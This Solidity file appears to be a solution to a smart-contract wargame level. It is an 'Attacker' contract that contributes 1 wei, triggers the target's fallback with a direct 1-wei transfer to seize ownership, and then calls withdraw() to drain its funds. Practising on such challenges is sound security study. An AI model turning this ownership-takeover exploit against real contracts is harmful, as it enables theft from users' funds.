// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "@levels/Fallback.sol";

contract Attacker {
    Fallback public target;

    constructor(address _target) payable {
        target = Fallback(payable(_target));
    }

    receive() external payable {}

    function exploit() public payable {
        target.contribute{value: 1 wei}();
        (bool success, bytes memory return_data) = payable(address(target))
            .call{value: 1 wei}("");
        require(success);
        target.withdraw();
    }
}
